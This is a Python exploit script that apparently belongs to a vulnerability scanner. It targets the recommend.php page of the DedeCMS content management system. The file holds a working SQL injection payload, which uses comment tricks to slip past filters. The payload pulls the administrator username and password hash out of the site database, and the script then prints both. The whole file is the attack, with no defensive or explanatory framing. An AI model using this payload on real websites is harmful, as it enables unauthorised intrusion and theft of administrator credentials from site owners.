import requests
from termcolor import cprint
import re

class recomsqli:

    def __init__(self,url):

        self.url = url

    def checksql(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate"
        }
        payload = "plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            result = re.search("\|\w+\|[a-zA-Z0-9]+", r.text)
            userpass = result.group()
            temp = userpass.split('|')
            username = temp[1]
            passw = temp[2][2:-1]
            cprint("target maybe have dede recommend.php SQL username is: " + username + "password is :" + passw,"red")
        except:
            return False

